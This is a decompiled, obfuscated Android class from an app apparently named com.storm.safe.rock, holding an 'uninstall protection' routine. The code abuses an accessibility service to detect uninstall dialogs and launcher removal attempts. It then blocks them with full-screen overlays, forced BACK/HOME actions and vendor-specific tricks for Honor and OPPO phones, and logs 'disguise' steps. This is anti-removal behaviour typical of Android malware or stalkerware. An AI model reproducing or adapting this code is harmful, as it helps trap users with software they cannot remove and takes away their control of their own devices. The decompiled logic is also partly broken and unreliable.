package p000;

import android.view.accessibility.AccessibilityNodeInfo;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.service.modules.C0328b3;
import com.storm.safe.rock.service.modules.protection.C0355a0;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.atomic.AtomicBoolean;
import kotlin.text.AbstractC0779a1;
import okhttp3.internal.p032ws.WebSocketProtocol;
import org.conscrypt.FileClientSessionCache;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* loaded from: classes2.dex */
public final /* synthetic */ class nk1 implements Runnable {

    /* renamed from: a0 */
    public final /* synthetic */ int f58646a0;

    /* renamed from: a1 */
    public final /* synthetic */ C0355a0 f58647a1;

    public /* synthetic */ nk1(C0355a0 c0355a0, int i) {
        this.f58646a0 = i;
        this.f58647a1 = c0355a0;
    }

    /* JADX WARN: Finally extract failed */
    /* JADX WARN: Removed duplicated region for block: B:102:0x01d9 A[ORIG_RETURN, RETURN] */
    /* JADX WARN: Removed duplicated region for block: B:160:0x02c8 A[ORIG_RETURN, RETURN] */
    @Override // java.lang.Runnable
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void run() throws InterruptedException {
        AccessibilityNodeInfo accessibilityNodeInfo;
        CharSequence packageName;
        String string;
        int i = 0;
        int i2 = 2;
        switch (this.f58646a0) {
            case 0:
                C0355a0 c0355a0 = this.f58647a1;
                try {
                    w00 w00Var = c0355a0.f53695d0;
                    if (w00Var != null && (accessibilityNodeInfo = (AccessibilityNodeInfo) w00Var.invoke()) != null && (packageName = accessibilityNodeInfo.getPackageName()) != null && (string = packageName.toString()) != null) {
                        String lowerCase = string.toLowerCase(Locale.ROOT);
                        t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                        if (c0355a0.f53667a2 && !c0355a0.f53675b0.get()) {
                            if (AbstractC0779a1.m213652a5(lowerCase, "launcher", false) || AbstractC0779a1.m213652a5(lowerCase, "home", false) || C0355a0.m211932d5(lowerCase)) {
                                t60.m214702c3("UninstallProtectionMgr", "🛡️ [overlay移除] 仍在桌面，等待下一次长按事件触发监控");
                            } else if (C0355a0.m211929d2(lowerCase)) {
                                t60.m214702c3("UninstallProtectionMgr", "🛡️ [overlay移除] 仍在危险包 " + lowerCase + "，重启轮询");
                                c0355a0.m211950e4(lowerCase);
                            }
                        }
                    }
                    return;
                } catch (Exception unused) {
                    return;
                }
            case 1:
                C0355a0 c0355a02 = this.f58647a1;
                try {
                    try {
                        w00 w00Var2 = c0355a02.f53695d0;
                        accessibilityNodeInfo = w00Var2 != null ? (AccessibilityNodeInfo) w00Var2.invoke() : null;
                        if (accessibilityNodeInfo != null) {
                            String[] strArr = {"卸载", "Uninstall", "移除", "Remove"};
                            int i3 = 0;
                            while (true) {
                                if (i3 < 4) {
                                    List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = accessibilityNodeInfo.findAccessibilityNodeInfosByText(strArr[i3]);
                                    if (listFindAccessibilityNodeInfosByText != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                                        Iterator<T> it = listFindAccessibilityNodeInfosByText.iterator();
                                        while (it.hasNext()) {
                                            try {
                                                ((AccessibilityNodeInfo) it.next()).recycle();
                                            } catch (Exception unused2) {
                                            }
                                        }
                                        List listM211940c6 = c0355a02.m211940c6();
                                        ArrayList arrayList = new ArrayList();
                                        for (Object obj : listM211940c6) {
                                            String str = (String) obj;
                                            if (!AbstractC0779a1.m213663b6(str) && AbstractC0779a1.m213687e0(str).toString().length() >= 2) {
                                                arrayList.add(obj);
                                            }
                                        }
                                        int size = arrayList.size();
                                        while (i < size) {
                                            Object obj2 = arrayList.get(i);
                                            i++;
                                            String str2 = (String) obj2;
                                            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText2 = accessibilityNodeInfo.findAccessibilityNodeInfosByText(str2);
                                            if (listFindAccessibilityNodeInfosByText2 != null && !listFindAccessibilityNodeInfosByText2.isEmpty()) {
                                                Iterator<T> it2 = listFindAccessibilityNodeInfosByText2.iterator();
                                                while (it2.hasNext()) {
                                                    try {
                                                        ((AccessibilityNodeInfo) it2.next()).recycle();
                                                    } catch (Exception unused3) {
                                                    }
                                                }
                                                t60.m214726f4("UninstallProtectionMgr", "🛡️⚡ [安装器弹窗] 卸载场景+检测到APP名'" + str2 + "' → 遮挡");
                                                c0355a02.f53676b1.postAtFrontOfQueue(new nk1(c0355a02, i2));
                                            }
                                        }
                                    }
                                    i3++;
                                } else {
                                    t60.m214702c3("UninstallProtectionMgr", "🛡️ [安装器弹窗] 未找到卸载关键词，非卸载场景，跳过");
                                }
                            }
                            if (accessibilityNodeInfo == null) {
                                return;
                            }
                        } else if (accessibilityNodeInfo == null) {
                        }
                    } catch (Throwable th) {
                        if (0 != 0) {
                            try {
                                accessibilityNodeInfo.recycle();
                            } catch (Exception unused4) {
                            }
                        }
                        throw th;
                    }
                } catch (Exception unused5) {
                    if (0 == 0) {
                        return;
                    }
                }
                try {
                    accessibilityNodeInfo.recycle();
                    return;
                } catch (Exception unused6) {
                    return;
                }
            case 2:
                C0355a0 c0355a03 = this.f58647a1;
                t60.m214695b6(c0355a03, "this$0");
                c0355a03.m211949e3();
                return;
            case 3:
                C0355a0 c0355a04 = this.f58647a1;
                try {
                    try {
                        w00 w00Var3 = c0355a04.f53695d0;
                        accessibilityNodeInfo = w00Var3 != null ? (AccessibilityNodeInfo) w00Var3.invoke() : null;
                        if (accessibilityNodeInfo != null) {
                            List listM211940c62 = c0355a04.m211940c6();
                            ArrayList arrayList2 = new ArrayList();
                            for (Object obj3 : listM211940c62) {
                                String str3 = (String) obj3;
                                if (!AbstractC0779a1.m213663b6(str3) && AbstractC0779a1.m213687e0(str3).toString().length() >= 2) {
                                    arrayList2.add(obj3);
                                }
                            }
                            int size2 = arrayList2.size();
                            int i4 = 0;
                            while (i4 < size2) {
                                Object obj4 = arrayList2.get(i4);
                                i4++;
                                String str4 = (String) obj4;
                                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText3 = accessibilityNodeInfo.findAccessibilityNodeInfosByText(str4);
                                if (listFindAccessibilityNodeInfosByText3 != null && !listFindAccessibilityNodeInfosByText3.isEmpty()) {
                                    t60.m214726f4("UninstallProtectionMgr", "🛡️⚡ [桌面→安装器] 确认弹窗包含APP名'" + str4 + "' → 立即遮挡");
                                    Iterator<T> it3 = listFindAccessibilityNodeInfosByText3.iterator();
                                    while (it3.hasNext()) {
                                        try {
                                            ((AccessibilityNodeInfo) it3.next()).recycle();
                                        } catch (Exception unused7) {
                                        }
                                    }
                                    c0355a04.f53676b1.postAtFrontOfQueue(new nk1(c0355a04, 7));
                                    c0355a04.m211945d9("DESKTOP_UNINSTALL", "桌面→安装器确认弹窗含APP名", AbstractC1117qo.m214451e7("installer_confirm"), "全屏遮挡", null);
                                    c0355a04.f53671a6 = false;
                                }
                            }
                            t60.m214702c3("UninstallProtectionMgr", "🛡️ [桌面→安装器] 安装器窗口未找到APP名，非我们的APP");
                            if (accessibilityNodeInfo == null) {
                                return;
                            }
                        } else if (accessibilityNodeInfo == null) {
                        }
                    } catch (Throwable th2) {
                        if (0 != 0) {
                            try {
                                accessibilityNodeInfo.recycle();
                            } catch (Exception unused8) {
                            }
                        }
                        throw th2;
                    }
                } catch (Exception unused9) {
                    if (0 == 0) {
                        return;
                    }
                }
                try {
                    accessibilityNodeInfo.recycle();
                    return;
                } catch (Exception unused10) {
                    return;
                }
            case 4:
                C0355a0 c0355a05 = this.f58647a1;
                t60.m214695b6(c0355a05, "this$0");
                c0355a05.m211946e0();
                return;
            case 5:
                C0355a0 c0355a06 = this.f58647a1;
                t60.m214695b6(c0355a06, "this$0");
                c0355a06.m211949e3();
                return;
            case 6:
                C0355a0 c0355a07 = this.f58647a1;
                t60.m214695b6(c0355a07, "this$0");
                c0355a07.m211949e3();
                return;
            case 7:
                C0355a0 c0355a08 = this.f58647a1;
                t60.m214695b6(c0355a08, "this$0");
                c0355a08.m211949e3();
                return;
            case 8:
                C0355a0 c0355a09 = this.f58647a1;
                dqtvuisjd dqtvuisjdVar = c0355a09.f53666a1;
                AtomicBoolean atomicBoolean = c0355a09.f53675b0;
                for (int i5 = 0; i5 < 3; i5++) {
                    try {
                        try {
                            dqtvuisjdVar.performGlobalAction(1);
                            Thread.sleep(80L);
                        } catch (Exception e) {
                            t60.m214705c6("UninstallProtectionMgr", "❌ 执行异常", e);
                        }
                    } catch (Throwable th3) {
                        atomicBoolean.set(false);
                        throw th3;
                    }
                }
                dqtvuisjdVar.performGlobalAction(2);
                atomicBoolean.set(false);
                return;
            case 9:
                C0355a0 c0355a010 = this.f58647a1;
                t60.m214695b6(c0355a010, "this$0");
                ok1 ok1Var = C0355a0.f53633e9;
                c0355a010.m211949e3();
                return;
            case 10:
                C0355a0 c0355a011 = this.f58647a1;
                t60.m214695b6(c0355a011, "this$0");
                ok1 ok1Var2 = C0355a0.f53633e9;
                c0355a011.m211949e3();
                return;
            case oe0.DEFAULT_M /* 11 */:
                C0355a0 c0355a012 = this.f58647a1;
                t60.m214695b6(c0355a012, "this$0");
                ok1 ok1Var3 = C0355a0.f53633e9;
                c0355a012.m211949e3();
                return;
            case FileClientSessionCache.MAX_SIZE /* 12 */:
                C0355a0 c0355a013 = this.f58647a1;
                dqtvuisjd dqtvuisjdVar2 = c0355a013.f53666a1;
                try {
                    Thread.sleep(50L);
                    AccessibilityNodeInfo rootInActiveWindow = dqtvuisjdVar2.getRootInActiveWindow();
                    boolean zM211906a0 = rootInActiveWindow != null ? C0355a0.m211906a0(c0355a013, rootInActiveWindow) : false;
                    if (rootInActiveWindow != null) {
                        rootInActiveWindow.recycle();
                    }
                    if (zM211906a0) {
                        t60.m214714d6("UninstallProtectionMgr", "🛡️ [系统卸载拦截] 荣耀：点击[从桌面移除]成功 → 触发伪装");
                    } else {
                        t60.m214714d6("UninstallProtectionMgr", "🛡️ [系统卸载拦截] 荣耀：无[从桌面移除] → BACK+伪装");
                        dqtvuisjdVar2.performGlobalAction(1);
                        Thread.sleep(100L);
                    }
                    try {
                        C0328b3 c0328b3 = c0355a013.f53692c7;
                        if (c0328b3 != null) {
                            int i6 = C0328b3.f53186a7;
                            c0328b3.m211758a2(false);
                        }
                    } catch (Exception unused11) {
                    }
                    C0355a0.m211923b7(c0355a013);
                    c0355a013.m211945d9("PKGINSTALLER_INTERCEPT", "桌面卸载拦截(荣耀+伪装)", AbstractC1117qo.m214451e7("卸载按钮"), zM211906a0 ? "从桌面移除+伪装" : "BACK+伪装", "launcher");
                    return;
                } catch (Exception unused12) {
                    dqtvuisjdVar2.performGlobalAction(2);
                    return;
                }
            case 13:
                dqtvuisjd dqtvuisjdVar3 = this.f58647a1.f53666a1;
                dqtvuisjdVar3.performGlobalAction(1);
                Thread.sleep(100L);
                dqtvuisjdVar3.performGlobalAction(2);
                return;
            case 14:
                C0355a0 c0355a014 = this.f58647a1;
                C0355a0.m211923b7(c0355a014);
                c0355a014.m211945d9("PKGINSTALLER_INTERCEPT", "桌面卸载拦截(OPPO)", AbstractC1117qo.m214451e7("卸载按钮"), "BACK+HOME+伪装", "launcher");
                return;
            case WebSocketProtocol.B0_MASK_OPCODE /* 15 */:
                this.f58647a1.f53666a1.performGlobalAction(1);
                return;
            default:
                C0355a0 c0355a015 = this.f58647a1;
                C0355a0.m211923b7(c0355a015);
                c0355a015.m211945d9("PKGINSTALLER_INTERCEPT", "桌面卸载全屏拦截", AbstractC1117qo.m214451e7("卸载按钮"), "全屏覆盖+伪装", "launcher");
                return;
        }
    }
}
